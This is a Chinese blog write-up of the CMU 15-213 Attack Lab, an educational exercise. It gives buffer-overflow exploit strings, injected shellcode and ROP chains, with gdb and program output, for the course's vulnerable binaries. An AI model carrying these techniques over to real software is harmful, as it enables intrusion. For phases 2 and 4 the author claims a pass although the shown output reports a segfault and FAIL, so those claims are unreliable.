---
title: CMU-15-213-Lab3-Attack-Lab
date: 2022-01-28 08:51:02
tags:
- 15-213
---

![](https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220129004851.png)

15-213 Attack Lab 做题笔记

<!--more-->
# 题目总览

| Phase | Program | Level | Method | Function | Points |
| ----- | ------- | ----- | ------ | -------- | ------ |
| 1     | CTARGET | 1     | CI     | touch1   | 10     |
| 2     | CTARGET | 2     | CI     | touch2   | 25     |
| 3     | CTARGET | 3     | CI     | touch3   | 25     |
| 4     | RTARGET | 2     | ROP    | touch2   | 35     |
| 5     | RTARGET | 3     | ROP    | touch3   | 5      |

<center>CI: Code injection</center>
<center>ROP: Return-oriented programming</center>

<center>Figure 1: Summary of attack lab phases</center>

如表格所示，本次 lab 有 5 个 pahse ，3 g个是代码注入，一个的 `Return-oriient programing` 返回式导向编程。

自这个 lab 开始，以后的 lab 都需要参考 writeup 才能知道题目要求是什么，知道该做什么

## level1

>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

该 pahse 要求我们在存在栈溢出的 `getbuf` 函数中修改他的返回地址到 `touch1` 函数，实现控制流劫持

```x86asm
pwndbg> disassemble getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	    sub    rsp,0x28
   0x00000000004017ac <+4>:	    mov    rdi,rsp
   0x00000000004017af <+7>:	    call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    eax,0x1
   0x00000000004017b9 <+17>:	add    rsp,0x28
   0x00000000004017bd <+21>:	ret
End of assembler dump.
pwndbg> p touch1
$2 = {void ()} 0x4017c0 <touch1>
```

看看 getbuf 的汇编代码，与 touch1 知道输入数据起始地址距离栈上的返回地址有 0x28 个字节 所以我们先在栈上填充 0x28 个字节再填充 touch1 的返回地址即可

expolit.txt 文件内容如下

```
❯ cat expolit.txt
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00
```


使用命令

```
❯ cat expolit.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00
```

**pahse1 pass**

## level2

>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.

该 phase 要求我们劫持返回地址到 touch2 并且 通过 cookie 的验证，对应的 cookie 数值在我们下载的文件 `cookie.txt` 中，验证的方式是将传入函数的参数(储存在 rdi 寄存器中)与 cookie 比较。

依照所给 writeup 中所给的 Appendix B 方法我们可以使用 gcc 和 objdump 获取汇编代码对应产生的字节序列

通过阅读函数 `stable_launch` 代码我们知道 该程序映射了一片新内存区域 `0x55586000 - 0x55686000` 上，权限为可读可写可执行，且后面将其作为栈上的内存使用

所以我们输入该程序的数据是处在一段可执行内存区域，可以将 shellcode 写入该内存区域，并且劫持控制流到对应地址，实现 rdi 寄存器的写入

```
❯ cat shellcode.s
movq $0x59b997fa,%rdi
ret

❯ gcc -c shellcode.s

❯ objdump -d shellcode.o

shellcode.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq
```

通过这样的命令我们可以知道汇编指令 `mov    $0x59b997fa,%rdi` 和 `ret` 对应的字节序列，且正好为 8 字节

接着使用 gdb 调试知道我们在 getbuf 函数中输入数据 存储的首地址为 `0x5561dc78`

加上 touch2 的地址

```
pwndbg> p touch2
$1 = {void (unsigned int)} 0x4017ec <touch2>
```

所以我们构造出这样的字节序列写入 expolit.txt 中

```
48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */
c3 /* ret */
61 61 61 61 61 61 61 61 /* padding */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 /* padding */
78 dc 61 55 00 00 00 00 /* address of shellcode */
ec 17 40 00 00 00 00 00 /* address of touch2 */
```

使用命令

```
❯ cat expolit.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:ctarget:0:48 C7 C7 FA 97 B9 59 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
```

**phase2 pass**

## level3

>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

该 pahse 使用了 hexmatch 函数去比较 cookie 与 我们传入的参数，我们传入的参数是一个指针，所以需要比较的 cookie 的值我们需要预先写入某段内存区域中，可将其写入返回地址之后，这样数据在栈上便于我们通过偏移计算地址

构造出这样的字节序列写入 expolit.txt 中

```
48 c7 c7 b8 dc 61 55 /* mov    $0x5561dcb8,%rdi */
c3 /* ret */
c3 /* ret */
00 00 00 00 00 00 00 /* padding */
61 61 61 61 61 61 61 61 /* padding */
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 /* padding */
78 dc 61 55 00 00 00 00 /* address of shellcode */
80 dc 61 55 00 00 00 00 /* second ret */
fa 18 40 00 00 00 00 00 /* address of touch3 */
35 39 62 39 39 37 66 61 /* strings of cookie*/
```

使用命令

```
❯ cat expolit.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 C3 C3 00 00 00 00 00 00 00 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 80 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```

**phase3 pass**

## level4

>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).

该 phase 部分与 phase2 相同，不同的在于栈上不具有可执行权限，所以我们使用 rop 的方法去达到目的

使用 `ROPgadget` 工具找到 gadget `0x000000000040141b : pop rdi ; ret`

构造出这样的字节序列写入 expolit.txt 中

```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 /* padding */
1b 14 40 00 00 00 00 00 /* pop rdi; ret */
fa 97 b9 59 00 00 00 00 /* hex number of cookie */
ec 17 40 00 00 00 00 00 /* address of touch2 */
```

使用命令

```
❯ cat expolit.txt | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:rtarget:0:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00
```

**pahse4 pass**

## level5

>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.

你已经得到 95 分，如果你还有其他重要的事，就可以现在停下去做你该做的了。

\>_< 很有趣的一段话，在保证学生学分的同时，不给予太大的压力。是一个十分人性的设计。

>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to
go beyond the normal expectations for the course.

该 phase 要求与 phase3 相同，不过就是程序开启了栈不可执行，与栈地址随机化，但是实际上并不难

通过 ROPgadget 发现 gadget `0x0000000000401a06 : mov rax, rsp ; ret`

构造出这样的字节序列写入 expolit.txt 中

```
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 /* padding */

1b 14 40 00 00 00 00 00 /* pop rdi; ret */
00 00 00 00 00 00 00 00
83 13 40 00 00 00 00 00 /* pop rsi ; ret */
00 5A 60 00 00 00 00 00 /* 0x605A00 */

30 0D 40 00 00 00 00 00 /* 0x400D30 */
/* read(0, *0x605A00, number x) */

1b 14 40 00 00 00 00 00 /* pop rdi; ret */
00 5A 60 00 00 00 00 00 /* 0x605A00 bss 段区域*/

fa 18 40 00 00 00 00 00 /* address of touch3 */

```

这里做一个说明 在 `getbuf` 函数中，读取完输入之后 `rdx` 寄存器是一个地址，对应 read 语句参数中 `number x` 远远大于我们所需要输入数据的量，所以这里 的 read 读取数据会直到遇见 `\n` 结束

将如下数据写入 in.txt 文件中

```
35 39 62 39 39 37 66 61 00 /* strings of cookie */
```

使用命令

```
❯ ./hex2raw < expolit.txt > expolit_raw.txt

❯ ./hex2raw < in.txt > out_raw.txt

❯ ./rtarget -q -i expolit_raw.txt < out_raw.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 1B 14 40 00 00 00 00 00 00 00 00 00 00 00 00 00 83 13 40 00 00 00 00 00 00 5A 60 00 00 00 00 00 30 0D 40 00 00 00 00 00 1B 14 40 00 00 00 00 00 00 5A 60 00 00 00 00 00 FA 18 40 00 00 00 00 00
```

这里解释一下为什么这样做

如果我们将 cookie 的字符串序列同样写在 expolit.txt 文件中，生成文件 expolit_raw.txt 。使用命令`./rtarget -q < expolit_raw.txt` 去运行，在执行到 read 函数时不会往对应地址中读取任何数据，我也并不知道这是为什么，好在目标文件提供了 `-i` 这个参数从文件中读取数据，我们使用 `-i` 参数去读取文件 expolit_raw.txt中数据，这样在执行 read 函数从标准输入流中读取数据时，我们就可以手动输入对应的 cookie 字符串，可是手动输入会把 `\n` 计算在字符串内，无法比较通过，这时候就可以将其写入一个文件中，通过输入重定向方式输入 `\x00` 截断字符串 这也是 in.txt 文件最后为什么有一个 `00` 存在的原因

**phase5 pass**

# 总结

这些题目来自 `Computer Systems: A Programmer's Perspective, 3/E (CS:APP3e)` 的 lab3 。

这部分内容对于学过一点 pwn 的我来说还是比较容易，cmu 的 `15-123` 的确也是一门不可多得的好课，通过做这两个实验，使我对汇编 objdump gdb 的认识也更近了一步。感觉虽然没能学到太多高深奥妙的东西，但是这种对于基础知识学习，将计算机基础打得更牢固的感觉也使我感到不错。
